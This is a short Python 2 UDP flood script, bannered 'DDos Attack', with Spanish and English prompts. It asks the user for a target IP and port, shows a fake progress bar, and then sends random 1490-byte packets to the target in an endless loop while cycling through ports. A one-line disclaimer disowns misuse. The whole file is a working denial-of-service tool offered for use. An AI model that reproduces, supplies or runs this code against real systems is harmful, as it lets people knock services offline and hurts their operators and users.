import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print """
   $$$$$\                                                                  $$$$$$\      $$$$$$\  
   \__$$ |                                                                $$  __$$\    $$$ __$$\ 
      $$ | $$$$$$\  $$$$$$\$$$$\  $$$$$$\$$$$\   $$$$$$\   $$$$$$\        \__/  $$ |   $$$$\ $$ |
      $$ | \____$$\ $$  _$$  _$$\ $$  _$$  _$$\ $$  __$$\ $$  __$$\        $$$$$$  |   $$\$$\$$ |
$$\   $$ | $$$$$$$ |$$ / $$ / $$ |$$ / $$ / $$ |$$$$$$$$ |$$ |  \__|      $$  ____/    $$ \$$$$ |
$$ |  $$ |$$  __$$ |$$ | $$ | $$ |$$ | $$ | $$ |$$   ____|$$ |            $$ |         $$ |\$$$ |
\$$$$$$  |\$$$$$$$ |$$ | $$ | $$ |$$ | $$ | $$ |\$$$$$$$\ $$ |            $$$$$$$$\ $$\\$$$$$$  /
 \______/  \_______|\__| \__| \__|\__| \__| \__| \_______|\__|            \________|\__|\______/ 
                                                                                                 
                                                                                                 
                                                                                                 
                                                                                                 """ 
print " I am not responsible for the misuse of this program "
print " no me hago responsable del mal uso de este programa "
ip = raw_input("IP De Ataque--> ")
port = input("Puerto De Entrada--> ")

print "Por Favor Espere"
print "please wait"
time.sleep(5)
os.system("clear")
os.system("figlet Attack Starting")
print "[###                 ]  "
time.sleep(1)
os.system("clear")
print "[#####               ]  "
time.sleep(1)
os.system("clear")
print "[############        ]  "
time.sleep(1)
os.system("clear")
print "[##############      ]  "
time.sleep(1)
os.system("clear")
print "[################    ]  "
time.sleep(1)
os.system("clear")
print "[#################   ]  "
time.sleep(1)
os.system("clear")
print "[##################  ]  "
time.sleep(1)
os.system("clear")
print "[################### ]  "
time.sleep(1)
os.system("clear")
print "[####################]  "
time.sleep(1)
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
